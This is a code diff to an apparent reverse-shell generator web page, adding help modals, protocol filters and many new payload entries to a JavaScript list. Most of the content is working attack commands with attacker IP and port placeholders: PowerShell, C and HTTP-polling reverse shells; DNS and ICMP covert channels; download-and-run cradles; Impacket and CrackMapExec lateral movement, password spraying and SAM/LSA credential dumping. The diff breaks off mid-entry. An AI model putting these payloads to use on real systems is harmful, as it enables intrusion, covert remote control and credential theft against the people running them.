@@ -69,7 +69,7 @@
       display: grid;
       grid-template-columns: 1fr 1fr 1fr 1fr;
       gap: 12px;
-      align-items: end;
+      align-items: start;
       margin-bottom: 14px;
     }
 
@@ -83,6 +83,14 @@
       color: #666;
       margin-bottom: 4px;
       letter-spacing: 1px;
+    }
+
+    .field-hint {
+      font-size: 0.68em;
+      color: #2a4a2a;
+      margin-top: 4px;
+      letter-spacing: 0.5px;
+      line-height: 1.4;
     }
 
     .prompt-green { color: #00ff00; }
@@ -166,7 +174,7 @@
     .tab-content.active { display: block; }
 
     /* ── SHELL LIST ── */
-    .shell-count { color: #444; font-size: 0.78em; letter-spacing: 1px; margin-bottom: 12px; }
+    .shell-count { color: #444; font-size: 0.78em; letter-spacing: 1px; margin-bottom: 12px; display: flex; align-items: center; justify-content: space-between; }
     .shell-count span { color: #00cc00; }
 
     .shell-item {
@@ -246,6 +254,137 @@
     }
 
     .shell-body code { color: #a0f0a0; font-size: 0.85em; }
+
+    /* ── HELP MODAL ── */
+    .tab-help-btn {
+      display: inline-block;
+      width: 20px;
+      height: 20px;
+      line-height: 20px;
+      text-align: center;
+      border-radius: 50%;
+      border: 1px solid #2a5a2a;
+      color: #2a5a2a;
+      font-size: 0.85em;
+      font-weight: bold;
+      margin-left: 5px;
+      cursor: pointer;
+      vertical-align: middle;
+      transition: all 0.15s;
+    }
+    .tab-help-btn:hover { border-color: #00cc00; color: #00cc00; }
+    .tab-btn.active .tab-help-btn { border-color: #00aa00; color: #00aa00; }
+    .tab-btn.active .tab-help-btn:hover { border-color: #00ff00; color: #00ff00; }
+
+    .help-overlay {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: rgba(0,0,0,0.75);
+      z-index: 1000;
+      align-items: center;
+      justify-content: center;
+    }
+    .help-overlay.show { display: flex; }
+
+    .help-modal {
+      background: #0a0a0a;
+      border: 1px solid #1a5a1a;
+      border-radius: 8px;
+      box-shadow: 0 0 40px rgba(0,255,0,0.12);
+      max-width: 680px;
+      width: calc(100% - 40px);
+      max-height: 88vh;
+      overflow-y: auto;
+      padding: 24px 28px;
+      position: relative;
+      font-family: 'Courier New', Consolas, monospace;
+    }
+
+    .help-modal-title {
+      color: #00ff00;
+      font-size: 1em;
+      letter-spacing: 2px;
+      margin-bottom: 18px;
+      padding-bottom: 10px;
+      border-bottom: 1px solid #1a3a1a;
+    }
+
+    .help-close {
+      position: absolute;
+      top: 14px; right: 16px;
+      background: transparent;
+      border: 1px solid #1a3a1a;
+      border-radius: 3px;
+      color: #555;
+      cursor: pointer;
+      font-family: inherit;
+      font-size: 0.8em;
+      padding: 2px 10px;
+    }
+    .help-close:hover { border-color: #00cc00; color: #00cc00; }
+
+    .help-diagram-wrap {
+      background: #030a03;
+      border: 1px solid #0d2a0d;
+      border-radius: 6px;
+      padding: 16px;
+      margin-bottom: 18px;
+    }
+
+    .help-steps {
+      display: flex;
+      flex-direction: column;
+      gap: 8px;
+      margin-bottom: 16px;
+    }
+
+    .help-step {
+      display: flex;
+      gap: 12px;
+      align-items: flex-start;
+    }
+
+    .help-step-num {
+      color: #00cc00;
+      font-size: 0.82em;
+      min-width: 22px;
+      padding-top: 1px;
+    }
+
+    .help-step-text {
+      color: #888;
+      font-size: 0.82em;
+      line-height: 1.5;
+    }
+
+    .help-step-text strong { color: #c0ffc0; }
+
+    .help-note {
+      color: #444;
+      font-size: 0.76em;
+      border-top: 1px solid #0d2a0d;
+      padding-top: 12px;
+      line-height: 1.6;
+    }
+
+    .help-note span { color: #00aa00; }
+
+    .help-section-divider {
+      border: none;
+      border-top: 1px solid #1a3a1a;
+      margin: 22px 0 18px;
+    }
+
+    .help-section-title {
+      color: #cc9900;
+      font-size: 0.9em;
+      letter-spacing: 2px;
+      margin-bottom: 14px;
+    }
+
+    .help-step-text .gold { color: #ffcc44; }
+    .help-step-text .dim  { color: #666; }
 
     /* ── LOTL TAB ── */
     .lotl-os-filter {
@@ -378,6 +517,11 @@
     .filter-chip.active-linux   { background: #1a1600; border-color: #5a4a10; color: #f0c060; }
     .filter-chip.active-mac     { background: #001620; border-color: #105a70; color: #60c0f0; }
     .filter-chip.active-windows { background: #140020; border-color: #4a1070; color: #a060f0; }
+    .filter-chip.active-dns     { background: #001a10; border-color: #106040; color: #40d090; }
+    .filter-chip.active-smb     { background: #1a0010; border-color: #601040; color: #e060a0; }
+    .filter-chip.active-http    { background: #001020; border-color: #104060; color: #60b0e0; }
+    .filter-chip.active-icmp    { background: #1a0a00; border-color: #603010; color: #e08040; }
+    .filter-chip.active-tool    { background: #0a0a1a; border-color: #303070; color: #9090e0; }
     .filter-chip.active-enc     { background: #1a1200; border-color: #604a00; color: #e0c030;
                                    text-shadow: 0 0 6px rgba(224,192,48,0.4); }
     .filter-chip.active-obf     { background: #141a00; border-color: #667700; color: #ccdd00; }
@@ -489,7 +633,7 @@
       border-top: 1px solid #0d2a0d;
       padding-top: 10px;
     }
-    .shell-diagram svg { width: 100%; height: auto; display: block; }
+    .shell-diagram svg { width: 100%; max-width: 520px; height: auto; display: block; }
 
     /* ── RESPONSIVE ── */
     @media (max-width: 600px) {
@@ -674,33 +818,42 @@
   <div class="config-panel">
     <div class="config-grid">
       <div class="field">
-        <label><span class="prompt-green">&gt;</span> LHOST / IP</label>
+        <label><span class="prompt-green">&gt;</span> IP ADDRESS</label>
         <input type="text" id="ip" value="10.10.10.10" placeholder="10.0.0.1" oninput="render()" />
+        <div class="field-hint">reverse/icmp/dns → attacker IP &nbsp;·&nbsp; smb/lateral → target IP</div>
       </div>
       <div class="field">
-        <label><span class="prompt-green">&gt;</span> LPORT</label>
+        <label><span class="prompt-green">&gt;</span> PORT</label>
         <input type="text" id="port" value="4444" placeholder="4444" oninput="render()" />
+        <div class="field-hint">reverse → listener port &nbsp;·&nbsp; bind/smb → target port</div>
       </div>
       <div class="field">
         <label><span class="prompt-green">&gt;</span> SHELL</label>
-        <select id="shell" onchange="render()">
+        <select id="shell" onchange="refreshListenerOptions(this.value);render()">
           <option value="/bin/bash">/bin/bash</option>
           <option value="/bin/sh">/bin/sh</option>
           <option value="/bin/zsh">/bin/zsh</option>
           <option value="cmd.exe">cmd.exe</option>
           <option value="powershell.exe">powershell.exe</option>
         </select>
+        <div class="field-hint">substituted as {shell} in commands &nbsp;·&nbsp; Windows shells remove rlwrap/socat from listener</div>
       </div>
       <div class="field">
         <label><span class="prompt-green">&gt;</span> LISTENER</label>
         <select id="listener" onchange="updateListener()">
-          <option value="nc">Netcat (nc)</option>
-          <option value="ncat">Ncat (ncat)</option>
-          <option value="socat">Socat</option>
-          <option value="rlwrap">rlwrap nc (TTY)</option>
-          <option value="msf">Metasploit handler</option>
-          <option value="pwncat_cs">pwncat-cs (calebstewart)</option>
-          <option value="pwncat_cy">pwncat (cytopia)</option>
+          <optgroup label="── Netcat ──">
+            <option value="nc_linux">nc · Linux/GNU (-lvnp)</option>
+            <option value="nc_bsd">nc · macOS/BSD (-l port)</option>
+            <option value="ncat">ncat · cross-platform</option>
+            <option value="rlwrap_linux">rlwrap nc · Linux (TTY)</option>
+            <option value="rlwrap_bsd">rlwrap nc · macOS (TTY)</option>
+          </optgroup>
+          <optgroup label="── Other ──">
+            <option value="socat">socat (fully interactive)</option>
+            <option value="msf">Metasploit handler</option>
+            <option value="pwncat_cs">pwncat-cs (calebstewart)</option>
+            <option value="pwncat_cy">pwncat (cytopia)</option>
+          </optgroup>
         </select>
       </div>
     </div>
@@ -721,6 +874,11 @@
     <button class="filter-chip" data-filter="linux"   onclick="toggleFilter(this)">&#9670; linux</button>
     <button class="filter-chip" data-filter="mac"     onclick="toggleFilter(this)">&#9670; mac</button>
     <button class="filter-chip" data-filter="windows" onclick="toggleFilter(this)">&#9670; windows</button>
+    <button class="filter-chip" data-filter="dns"     onclick="toggleFilter(this)">&#9670; dns</button><button class="tab-help-btn" onclick="showHelp('dns')" title="How does a DNS shell work?" style="margin-left:2px;margin-right:6px">?</button>
+    <button class="filter-chip" data-filter="smb"     onclick="toggleFilter(this)">&#9670; smb</button>
+    <button class="filter-chip" data-filter="http"    onclick="toggleFilter(this)">&#9670; http</button>
+    <button class="filter-chip" data-filter="icmp"    onclick="toggleFilter(this)">&#9670; icmp</button>
+    <button class="filter-chip" data-filter="tool"    onclick="toggleFilter(this)">&#9670; tool</button>
     <button class="filter-chip" data-filter="enc"     onclick="toggleFilter(this)">&#128274; encrypted</button>
     <button class="filter-chip" data-filter="obf"     onclick="toggleFilter(this)">&#9654; obfuscatable</button>
   </div>
@@ -737,13 +895,13 @@
 
   <!-- TAB: REVERSE -->
   <div class="tab-content active" id="tab-reverse">
-    <div class="shell-count">Showing <span id="count-reverse">0</span> reverse shells</div>
+    <div class="shell-count"><span>Showing <span id="count-reverse">0</span> reverse shells</span><button class="tab-help-btn" onclick="showHelp('reverse')" title="How does a reverse shell work?">?</button></div>
     <div id="list-reverse"></div>
   </div>
 
   <!-- TAB: BIND -->
   <div class="tab-content" id="tab-bind">
-    <div class="shell-count">Showing <span id="count-bind">0</span> bind shells</div>
+    <div class="shell-count"><span>Showing <span id="count-bind">0</span> bind shells</span><button class="tab-help-btn" onclick="showHelp('bind')" title="How does a bind shell work?">?</button></div>
     <div id="list-bind"></div>
   </div>
 
@@ -818,6 +976,20 @@
 
 <div id="toast">copied to clipboard</div>
 
+<!-- HELP MODAL -->
+<div class="help-overlay" id="help-overlay" onclick="closeHelp()">
+  <div class="help-modal" onclick="event.stopPropagation()">
+    <button class="help-close" onclick="closeHelp()">✕ close</button>
+    <div class="help-modal-title" id="help-title"></div>
+    <div class="help-diagram-wrap">
+      <svg id="help-svg" viewBox="0 0 620 160" xmlns="http://www.w3.org/2000/svg" style="width:100%;height:auto;display:block"></svg>
+    </div>
+    <div class="help-steps" id="help-steps"></div>
+    <div class="help-note" id="help-note"></div>
+    <div id="help-extra"></div>
+  </div>
+</div>
+
 <script>
 // ── DATA ──────────────────────────────────────────────────────────────────────
 
@@ -876,7 +1048,7 @@ const REVERSE = [
   { name:'PowerShell #2',  meta:['windows'],         cmd:'powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(\'{ip}\',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"' },
   { name:'PowerShell #3',  meta:['windows'],         cmd:'powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient(\'{ip}\', {port});$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + \'SHELL> \');$StreamWriter.Flush()}WriteToStream \'\';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()"' },
   { name:'PowerShell #4 TLS', meta:['windows'],      encrypted:true, cmd:'$sslProtocols = [System.Security.Authentication.SslProtocols]::Tls12; $TCPClient = New-Object Net.Sockets.TCPClient(\'{ip}\', {port});$NetworkStream = $TCPClient.GetStream();$SslStream = New-Object Net.Security.SslStream($NetworkStream,$false,({$true} -as [Net.Security.RemoteCertificateValidationCallback]));$SslStream.AuthenticateAsClient(\'cloudflare-dns.com\',$null,$sslProtocols,$false);$StreamWriter = New-Object IO.StreamWriter($SslStream);function WriteToStream ($String) {[byte[]]$script:Buffer = New-Object System.Byte[] 4096;$StreamWriter.Write($String + \'SHELL> \');$StreamWriter.Flush()};WriteToStream \'\';while(($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()' },
-  { name:'Windows ConPty',  meta:['windows'],        cmd:'IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell {ip} {port}' },
+  { name:'Windows ConPty',  meta:['windows','tool'],  cmd:'IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell {ip} {port}' },
 
   // ── C / C# ──
   { name:'C (Linux)',      meta:['linux','mac'],     cmd:'#include <stdio.h>\n#include <sys/socket.h>\n#include <sys/types.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <netinet/in.h>\n#include <arpa/inet.h>\n\nint main(void){\n    int port = {port};\n    struct sockaddr_in revsockaddr;\n    int sockt = socket(AF_INET, SOCK_STREAM, 0);\n    revsockaddr.sin_family = AF_INET;\n    revsockaddr.sin_port = htons(port);\n    revsockaddr.sin_addr.s_addr = inet_addr("{ip}");\n    connect(sockt, (struct sockaddr *) &revsockaddr, sizeof(revsockaddr));\n    dup2(sockt, 0);\n    dup2(sockt, 1);\n    dup2(sockt, 2);\n    char * const argv[] = {"{shell}", NULL};\n    execvp("{shell}", argv);\n    return 0;\n}' },
@@ -926,7 +1098,7 @@ const REVERSE = [
   { name:'Haskell',        meta:['linux','mac'],     cmd:"module Main where\nimport System.Process\nmain = callCommand \"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | {shell} -i 2>&1 | nc {ip} {port} >/tmp/f\"" },
 
   // ── CHASHELL (DNS reverse shell) ──
-  { name:'Chashell (DNS)',  meta:['linux','mac','windows'], encrypted:true,
+  { name:'Chashell (DNS)',  meta:['linux','mac','windows','dns','tool'], encrypted:true,
     cmd:'# Run on target after build:\n./chashell\n# (DNS traffic tunnels to chaserv on attacker)',
     setup:[
       { title:'Clone & enter repo', cmd:'git clone https://github.com/kost/chashell && cd chashell' },
@@ -939,7 +1111,7 @@ const REVERSE = [
   },
 
   // ── FUEGOSHELL (SMB / Named Pipe) ──
-  { name:'FuegoShell Reverse (SMB/NamedPipe)', meta:['windows'],
+  { name:'FuegoShell Reverse (SMB/NamedPipe)', meta:['windows','smb','tool'],
     cmd:'# Generate oneliner on attacker, paste on target:\npowershell -exec bypass .\\generate_reverse_fuegoshell.ps1',
     setup:[
       { title:'Clone repo', cmd:'git clone https://github.com/v1k1ngfr/fuegoshell && cd fuegoshell/fuegoshell' },
@@ -947,7 +1119,7 @@ const REVERSE = [
       { title:'Why it works', cmd:'# Reuses TCP 445 (SMB) via named pipes — no new listening port\n# No local admin required, bypasses port-based firewall rules' },
     ]
   },
-  { name:'FuegoShell Bind (SMB/NamedPipe)', meta:['windows'],
+  { name:'FuegoShell Bind (SMB/NamedPipe)', meta:['windows','smb','tool'],
     cmd:'# Generate oneliner on target:\npowershell -exec bypass .\\generate_bind_fuegoshell.ps1',
     setup:[
       { title:'Clone repo', cmd:'git clone https://github.com/v1k1ngfr/fuegoshell && cd fuegoshell/fuegoshell' },
@@ -968,16 +1140,140 @@ const REVERSE = [
   },
 
   // ── HOAXSHELL (HTTP/S polling) ──
-  { name:'HoaxShell CMD cURL (HTTP)', meta:['windows'], encrypted:true,
+  { name:'HoaxShell CMD cURL (HTTP)', meta:['windows','tool','http'], encrypted:true,
     cmd:'@echo off&cmd /V:ON /C "SET ip={ip}:{port}&&SET sid="Authorization: eb6a44aa-8acc1e56-629ea455"&&SET protocol=http://&&curl !protocol!!ip!/eb6a44aa -H !sid! > NUL && for /L %i in (0) do (curl -s !protocol!!ip!/8acc1e56 -H !sid! > !temp!\\cmd.bat & type !temp!\\cmd.bat | findstr None > NUL & if errorlevel 1 ((!temp!\\cmd.bat > !tmp!\\out.txt 2>&1) & curl !protocol!!ip!/629ea455 -X POST -H !sid! --data-binary @!temp!\\out.txt > NUL)) & timeout 1" > NUL' },
-  { name:'HoaxShell PowerShell IEX (HTTP)', meta:['windows'], encrypted:true,
+  { name:'HoaxShell PowerShell IEX (HTTP)', meta:['windows','tool','http'], encrypted:true,
     cmd:"$s='{ip}:{port}';$i='14f30f27-650c00d7-fef40df7';$p='http://';$v=IRM -UseBasicParsing -Uri $p$s/14f30f27 -Headers @{\"Authorization\"=$i};while ($true){$c=(IRM -UseBasicParsing -Uri $p$s/650c00d7 -Headers @{\"Authorization\"=$i});if ($c -ne 'None') {$r=IEX $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=IRM -Uri $p$s/fef40df7 -Method POST -Headers @{\"Authorization\"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}" },
-  { name:'HoaxShell PowerShell IEX (HTTPS)', meta:['windows'], encrypted:true,
+  { name:'HoaxShell PowerShell IEX (HTTPS)', meta:['windows','tool','http'], encrypted:true,
     cmd:"add-type @\"\nusing System.Net;using System.Security.Cryptography.X509Certificates;\npublic class TrustAllCertsPolicy : ICertificatePolicy {public bool CheckValidationResult(\nServicePoint srvPoint, X509Certificate certificate,WebRequest request, int certificateProblem) {return true;}}\n\"@\n[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy\n$s='{ip}:{port}';$i='1cdbb583-f96894ff-f99b8edc';$p='https://';$v=Invoke-RestMethod -UseBasicParsing -Uri $p$s/1cdbb583 -Headers @{\"Authorization\"=$i};while ($true){$c=(Invoke-RestMethod -UseBasicParsing -Uri $p$s/f96894ff -Headers @{\"Authorization\"=$i});if ($c -ne 'None') {$r=iex $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-RestMethod -Uri $p$s/f99b8edc -Method POST -Headers @{\"Authorization\"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}" },
-  { name:'HoaxShell PowerShell Outfile (HTTP)', meta:['windows'], encrypted:true,
+  { name:'HoaxShell PowerShell Outfile (HTTP)', meta:['windows','tool','http'], encrypted:true,
     cmd:"$s='{ip}:{port}';$i='add29918-6263f3e6-2f810c1e';$p='http://';$f=\"C:\\Users\\$env:USERNAME\\.local\\hack.ps1\";$v=Invoke-RestMethod -UseBasicParsing -Uri $p$s/add29918 -Headers @{\"Authorization\"=$i};while ($true){$c=(Invoke-RestMethod -UseBasicParsing -Uri $p$s/6263f3e6 -Headers @{\"Authorization\"=$i});if ($c -eq 'exit') {del $f;exit} elseif ($c -ne 'None') {echo \"$c\" | out-file -filepath $f;$r=powershell -ep bypass $f -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-RestMethod -Uri $p$s/2f810c1e -Method POST -Headers @{\"Authorization\"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}" },
-  { name:'HoaxShell CMD cURL (HTTPS)', meta:['windows'], encrypted:true,
+  { name:'HoaxShell CMD cURL (HTTPS)', meta:['windows','tool','http'], encrypted:true,
     cmd:'@echo off&cmd /V:ON /C "SET ip={ip}:{port}&&SET sid="Authorization: eb6a44aa-8acc1e56-629ea455"&&SET protocol=https://&&curl -fs -k !protocol!!ip!/eb6a44aa -H !sid! > NUL & for /L %i in (0) do (curl -fs -k !protocol!!ip!/8acc1e56 -H !sid! > !temp!\\cmd.bat & type !temp!\\cmd.bat | findstr None > NUL & if errorlevel 1 ((!temp!\\cmd.bat > !tmp!\\out.txt 2>&1) & curl -fs -k !protocol!!ip!/629ea455 -X POST -H !sid! --data-binary @!temp!\\out.txt > NUL)) & timeout 1" > NUL' },
+
+  // ── DNSCAT2 (DNS C2) ──
+  { name:'dnscat2 client (DNS)', meta:['linux','mac','windows','dns','tool'],
+    cmd:'# On target (after build):\ndnscat2 --dns domain=c.YOURDOMAIN.com,server={ip} --secret=SHAREDSECRET',
+    setup:[
+      { title:'Attacker — clone & install server', cmd:'git clone https://github.com/iagox86/dnscat2 && cd dnscat2/server\nbundle install' },
+      { title:'Attacker — start server with secret', cmd:'ruby dnscat2.rb --dns "domain=c.YOURDOMAIN.com" --secret SHAREDSECRET\n# Or without domain (direct UDP 53):\nruby dnscat2.rb --secret SHAREDSECRET' },
+      { title:'Target — build Linux client', cmd:'git clone https://github.com/iagox86/dnscat2 && cd dnscat2/client && make\n./dnscat2 --dns domain=c.YOURDOMAIN.com,server={ip} --secret SHAREDSECRET' },
+      { title:'Target — build Windows client', cmd:'# Download prebuilt from releases or cross-compile:\nmingw32-make\n# Or use PowerShell dnscat2 client (no compile needed):\nIEX (New-Object Net.WebClient).DownloadString("http://downloads.skullsecurity.org/dnscat2/dnscat2.ps1")\nStart-Dnscat2 -Domain c.YOURDOMAIN.com -DNSServer {ip} -PreSharedSecret SHAREDSECRET' },
+      { title:'DNS zone records needed', cmd:'; Delegate subdomain c.YOURDOMAIN.com to your server:\nc.yourdomain.com.  300  IN  NS  ns1.yourdomain.com.\nns1.yourdomain.com. 300  IN  A  {ip}' },
+    ]
+  },
+  { name:'dnscat2 PowerShell client (DNS)', meta:['windows','dns','tool'],
+    cmd:"IEX (New-Object Net.WebClient).DownloadString('https://downloads.skullsecurity.org/dnscat2/dnscat2.ps1')\nStart-Dnscat2 -Domain c.YOURDOMAIN.com -DNSServer {ip} -PreSharedSecret SHAREDSECRET",
+    setup:[
+      { title:'Attacker — start dnscat2 server', cmd:'ruby dnscat2.rb --dns "domain=c.YOURDOMAIN.com" --secret SHAREDSECRET' },
+      { title:'Note', cmd:'# No client build needed — pure PowerShell\n# Download URL can be hosted on your own server to avoid external dependency' },
+    ]
+  },
+  { name:'iodine (IP-over-DNS tunnel)', meta:['linux','mac','dns','tool'],
+    cmd:'# On target:\niodine -f -P DNSPASSWORD {ip} tunnel.YOURDOMAIN.com\n# After connect — SSH through the DNS tunnel:\nssh user@172.16.0.1',
+    setup:[
+      { title:'Install iodine on both sides', cmd:'# Debian/Ubuntu:\napt install iodine\n# macOS:\nbrew install iodine' },
+      { title:'Attacker — start iodined server', cmd:'iodined -f -P DNSPASSWORD 172.16.0.1 tunnel.YOURDOMAIN.com\n# Creates a tun0 interface at 172.16.0.1/27' },
+      { title:'DNS zone records', cmd:'; Delegate subdomain tunnel.YOURDOMAIN.com:\ntunnel.yourdomain.com.  300  IN  NS  ns1.yourdomain.com.\nns1.yourdomain.com.     300  IN  A  {ip}' },
+      { title:'Target connects back', cmd:'iodine -f -P DNSPASSWORD {ip} tunnel.YOURDOMAIN.com\n# Creates tun0 at 172.16.0.2 — full IP connectivity over DNS' },
+    ]
+  },
+  { name:'dns2tcp (TCP-over-DNS)', meta:['linux','dns','tool'],
+    cmd:'# On target:\ndns2tcpc -r shell -z tunnel.YOURDOMAIN.com {ip} -l 4444 -k SHAREDSECRET &\nnc 127.0.0.1 4444',
+    setup:[
+      { title:'Install dns2tcp', cmd:'apt install dns2tcp' },
+      { title:'Attacker — dns2tcpd config', cmd:'cat > /etc/dns2tcpd.conf <<EOF\nlisten = 0.0.0.0\nport = 53\nuser = nobody\nkey = SHAREDSECRET\nchroot = /tmp\ndomain = tunnel.YOURDOMAIN.com\nresources = shell:127.0.0.1:4444\nEOF' },
+      { title:'Attacker — start server + listener', cmd:'dns2tcpd -f /etc/dns2tcpd.conf -F\nnc -lvnp 4444' },
+    ]
+  },
+
+  // ── SMB / LATERAL MOVEMENT (Impacket) ──
+  { name:'Impacket psexec (SMB)', meta:['linux','mac','smb','tool'],
+    cmd:'python3 psexec.py DOMAIN/USER:PASS@{ip} cmd.exe\n# Hash pass-the-hash:\npython3 psexec.py -hashes :NTHASH DOMAIN/USER@{ip} cmd.exe',
+    setup:[
+      { title:'Install Impacket', cmd:'pip3 install impacket\n# Or from source:\ngit clone https://github.com/fortra/impacket && pip3 install .' },
+      { title:'Note', cmd:'# Copies a service binary via SMB to ADMIN$, registers it, executes\n# Requires local admin or SMB write access\n# Creates a noisy Windows service — check EDR coverage' },
+    ]
+  },
+  { name:'Impacket smbexec (SMB)', meta:['linux','mac','smb','tool'],
+    cmd:'python3 smbexec.py DOMAIN/USER:PASS@{ip}\n# Hash:\npython3 smbexec.py -hashes :NTHASH DOMAIN/USER@{ip}',
+    setup:[
+      { title:'Install Impacket', cmd:'pip3 install impacket' },
+      { title:'Difference vs psexec', cmd:'# Executes commands via batch file on remote share — no binary upload\n# Less noisy than psexec but still creates a temp service\n# Output goes via SMB pipe' },
+    ]
+  },
+  { name:'Impacket wmiexec (WMI/SMB)', meta:['linux','mac','smb','tool'],
+    cmd:'python3 wmiexec.py DOMAIN/USER:PASS@{ip} "cmd /c whoami"\n# Interactive shell:\npython3 wmiexec.py DOMAIN/USER:PASS@{ip}\n# Hash:\npython3 wmiexec.py -hashes :NTHASH DOMAIN/USER@{ip}',
+    setup:[
+      { title:'Install Impacket', cmd:'pip3 install impacket' },
+      { title:'Note', cmd:'# Uses DCOM/WMI over port 135 + dynamic high ports\n# No service installation — output fetched via SMB share ADMIN$\n# Semi-interactive shell — each command spawns cmd.exe' },
+    ]
+  },
+  { name:'Impacket atexec (Task Scheduler/SMB)', meta:['linux','mac','smb','tool'],
+    cmd:'python3 atexec.py DOMAIN/USER:PASS@{ip} "whoami > \\\\\\\\{ip}\\\\C$\\\\out.txt"',
+    setup:[
+      { title:'Install Impacket', cmd:'pip3 install impacket' },
+      { title:'Note', cmd:'# Schedules a task via SAM-R and AT interface over SMB\n# Task runs as SYSTEM — useful for privilege escalation\n# No interactive shell — single command execution only' },
+    ]
+  },
+  { name:'CrackMapExec SMB exec', meta:['linux','mac','smb','tool'],
+    cmd:'# Command execution:\ncrackmapexec smb {ip} -u USER -p PASS -x "cmd /c whoami"\n# PowerShell:\ncrackmapexec smb {ip} -u USER -p PASS -X "whoami"\n# Pass-the-hash:\ncrackmapexec smb {ip} -u USER -H NTHASH -x "cmd /c whoami"',
+    setup:[
+      { title:'Install CrackMapExec (netexec)', cmd:'# Modern fork (recommended):\npipx install netexec\n# Or legacy CME:\npipx install crackmapexec' },
+      { title:'Spray password across subnet', cmd:'crackmapexec smb 192.168.1.0/24 -u USER -p PASS --continue-on-success' },
+      { title:'Dump SAM / LSA secrets', cmd:'crackmapexec smb {ip} -u USER -p PASS --sam\ncrackmapexec smb {ip} -u USER -p PASS --lsa' },
+    ]
+  },
+  { name:'Evil-WinRM (WinRM/HTTP)', meta:['windows','linux','mac','http','smb','tool'], encrypted:true,
+    cmd:'evil-winrm -i {ip} -u USER -p PASS\n# Pass-the-hash:\nevil-winrm -i {ip} -u USER -H NTHASH\n# With SSL:\nevil-winrm -i {ip} -u USER -p PASS -S',
+    setup:[
+      { title:'Install Evil-WinRM', cmd:'gem install evil-winrm\n# Or with bundler:\ngit clone https://github.com/Hackplayers/evil-winrm && gem install bundler && bundle install' },
+      { title:'Requirements on target', cmd:'# WinRM must be enabled on target (port 5985 HTTP / 5986 HTTPS)\n# Enable WinRM on target:\nwinrm quickconfig -y\n# Or via PowerShell:\nEnable-PSRemoting -Force' },
+      { title:'Upload / download files', cmd:'# Inside evil-winrm session:\nupload /local/path/file.exe C:\\\\Windows\\\\Temp\\\\file.exe\ndownload C:\\\\Users\\\\Administrator\\\\secret.txt /local/secret.txt' },
+      { title:'Load PowerShell scripts in memory', cmd:'# Pass script dir at startup:\nevil-winrm -i {ip} -u USER -p PASS -s /opt/ps-scripts/\n# Inside session, load without touching disk:\nInvoke-PowerView.ps1' },
+    ]
+  },
+
+  // ── ICMP SHELLS ──
+  { name:'icmpsh (ICMP reverse)', meta:['linux','windows','icmp','tool'],
+    cmd:'# On target (Windows):\nicmpsh.exe -t {ip} -d 500 -b 30 -s 128\n# On target (Linux):\n./icmpsh -t {ip}',
+    setup:[
+      { title:'Attacker — clone & prepare', cmd:'git clone https://github.com/bdamele/icmpsh\n# Disable local ICMP replies (required):\nsysctl -w net.ipv4.icmp_echo_ignore_all=1' },
+      { title:'Attacker — start listener', cmd:'cd icmpsh && python3 icmpsh_m.py {ip} TARGET_IP\n# Or with impacket:\npython3 impacket-icmpsh {ip}' },
+      { title:'Note', cmd:'# Tunnels a shell inside ICMP echo request/reply packets\n# Bypasses firewalls that allow ICMP but block TCP/UDP\n# No listening port on either side — pure ICMP' },
+    ]
+  },
+  { name:'PowerShell ICMP shell (Nishang)', meta:['windows','icmp','tool'],
+    cmd:'# On target:\nIEX (New-Object Net.WebClient).DownloadString("http://{ip}:{port}/Invoke-PowerShellIcmp.ps1")\nInvoke-PowerShellIcmp -IPAddress {ip}',
+    setup:[
+      { title:'Attacker — get Nishang', cmd:'git clone https://github.com/samratashok/nishang' },
+      { title:'Attacker — serve the script', cmd:'cd nishang/Shells && python3 -m http.server {port}' },
+      { title:'Attacker — ICMP listener', cmd:'# Install dependencies:\npip3 install impacket\n# Start listener:\npython3 nishang/Utility/icmpsh_m.py {ip} TARGET_IP' },
+      { title:'Disable ICMP replies on attacker', cmd:'sysctl -w net.ipv4.icmp_echo_ignore_all=1' },
+    ]
+  },
+
+  // ── HTTP CRADLES & POLLING ──
+  { name:'PowerShell IEX HTTP cradle', meta:['windows','http'],
+    cmd:"IEX (New-Object Net.WebClient).DownloadString('http://{ip}:{port}/shell.ps1')" },
+  { name:'PowerShell IEX HTTPS cradle', meta:['windows','http'], encrypted:true,
